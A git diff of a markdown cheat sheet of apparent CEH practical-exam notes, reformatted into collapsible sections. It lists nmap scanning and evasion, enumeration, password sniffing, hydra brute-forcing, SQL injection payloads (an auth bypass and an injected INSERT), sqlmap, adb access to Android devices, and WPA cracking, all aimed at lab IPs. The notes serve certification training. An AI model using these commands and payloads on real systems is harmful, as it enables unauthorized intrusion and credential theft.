@@ -1,5 +1,7 @@
 # My ceh practical notes
-#  Scanning Networks (always do sudo su) --> To be root
+<details>
+<summary>Scanning Networks (always do sudo su) --> To be root</summary>
+
 ```
 1- Nmap scan for alive/active hosts command for 192.189.19.18- nmap -A 192.189.19.0/24 or nmap -T4 -A ip
 2- Zenmap/nmap command for TCP scan- First put the target ip in the Target: and then in the Command: put this command- nmap -sT -v 10.10.10.16
@@ -11,7 +13,10 @@ If even this the above command is not working then use this command-  namp -f 10
 7- If host is windows then use this command - nmap --script smb-os-discovery.nse 192.168.12.22 (this script determines the OS, computer name, domain, workgroup, time over smb protocol (ports 445 or 139).
 8- nmap command for source port manipulation, in this port is given or we use common port-  nmap -g 80 10.10.10.10
 ```
-# Enumeration
+</details>
+<details>
+<summary>Enumeration</summary>
+
 ```
 1- NetBios enum using windows- in cmd type- nbtstat -a 10.10.10.10 (-a displays NEtBIOS name table)
 2- NetBios enum using nmap- nmap -sV -v --script nbstat.nse 10.10.10.16
@@ -22,17 +27,26 @@ If even this the above command is not working then use this command-  namp -f 10
 6- NetBios enum using enum4linux- enum4linux -u martin -p apple -n 10.10.10.10 (all info)
 				  enum4linux -u martin -p apple -P 10.10.10.10 (policy info)
 ```
-#  Quick Overview (Stegnography) --> Snow , Openstego
+</details>
+<details>
+<summary>Quick Overview (Stegnography) --> Snow , Openstego</summary>
+
 ```
 1- Hide Data Using Whitespace Stegnography- snow -C -m "My swiss account number is 121212121212" -p "magic" readme.txt readme2.txt  (magic is password and your secret is stored in readme2.txt along with the content of readme.txt)
 2- To Display Hidden Data- snow -C -p "magic" readme2.txt (then it will show the content of readme2.txt content)
 3- Image Stegnography using Openstego- PRACTICE ??
 ```
-#  Sniffing
+</details>
+<details>
+<summary>Sniffing</summary>
+
 ```
 1- Password Sniffing using Wireshark- In pcap file apply filter: http.request.method==POST (you will get all the post request) Now to capture password click on edit in menu bar, then near Find packet section, on the "display filter" select "string", also select "Packet details" from the drop down of "Packet list", also change "narrow & wide" to "Narrow UTF-8 & ASCII", and then type "pwd" in the find section.
 ```
-#  Hacking Web Servers
+</details>
+<details>
+<summary>Hacking Web Servers</summary>
+
 ```
 1- Footprinting web server Using Netcat and Telnet- nc -vv www.movies.com 80
 						    GET /HTTP/1.0
@@ -46,7 +60,10 @@ Now in terminal type-  hydra -L /home/attacker/Desktop/CEH_TOOLS/Wordlists/Usern
 
 hydra -l user -P passlist.txt ftp://10.10.10.10
 ```
-#  Hacking Web Application
+</details>
+<details>
+<summary>Hacking Web Application</summary>
+
 ```
 1- Scan Using OWASP ZAP (Parrot)- Type zaproxy in the terminal and then it would open. In target tab put the url and click automated scan.
 2- Directory Bruteforcing- gobuster dir -u 10.10.10.10 -w /home/attacker/Desktop/common.txt
@@ -69,7 +86,8 @@ Then type msfconsole to open metasploit. Type -  use auxilliary/scanner/http/wor
 Now you can do a RDP connection with the given ip and the Test account which you created.
 ```
 <details>
-<summary>#  SQL Injections</summary>
+<summary>SQL Injections</summary>
+
 ```
 1- Auth Bypass-  hi'OR 1=1 --
 2- Insert new details if sql injection found in login page in username tab enter- blah';insert into login values('john','apple123');--
@@ -83,29 +101,38 @@ sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie value that yo
 6.2 Use systeminfo for windows to get all os version
 6.3 Use uname -a for linux to get os version
 ```
-</details>	
-# Android
+	
+</details>
+<details>
+<summary>Android</summary>
+
 ```
 1- nmap ip -sV -p 5555    (Scan for adb port)
 2- adb connect IP:5555    (Connect adb with parrot)
 3- adb shell              (Access mobile device on parrot)
 4- pwd --> ls --> cd sdcard --> ls --> cat secret.txt (If you can't find it there then go to Downloads folder using: cd downloads)
 ```
-# Wireshark
+</details>
+<details>
+<summary>Wireshark</summary>
+
 ```
 tcp.flags.syn == 1 and tcp.flags.ack == 0    (How many machines) or Go to statistics IPv4 addresses--> Source and Destination ---> Then you can apply the filter given
 tcp.flags.syn == 1   (Which machine for dos)
 http.request.method == POST   (for passwords) or click tools ---> credentials
 Also
 ```
+</details>
 <details>
-# Find FQDN
+<summary>Find FQDN</summary>
+
 ```
 nmap -p389 –sV -iL <target_list>  or nmap -p389 –sV <target_IP> (Find the FQDN in a subnet/network)
 ```
 </details>
 <details>
-<summary># Cracking Wi-Fi networks </summary>
+<summary>Cracking Wi-Fi networks </summary>
+
 ```
 Cracking Wifi Password
 aircrack-ng [pcap file] (For cracking WEP network)
@@ -113,7 +140,8 @@ aircrack-ng -a2 -b [Target BSSID] -w [password_Wordlist.txt] [WP2 PCAP file] (Fo
 </details>
 ```
 <details> 
-<summary>#  Some extra work </summary>
+<summary> Some extra work </summary>
+
 ```
 Check RDP enabled after getting ip- nmap -p 3389 -iL ip.txt | grep open (ip.txt contains all the alive hosts from target subnet)
 Check MySQL service running- nmap -p 3306 -iL ip.txt | grep open        (ip.txt contains all the alive hosts from target subnet)
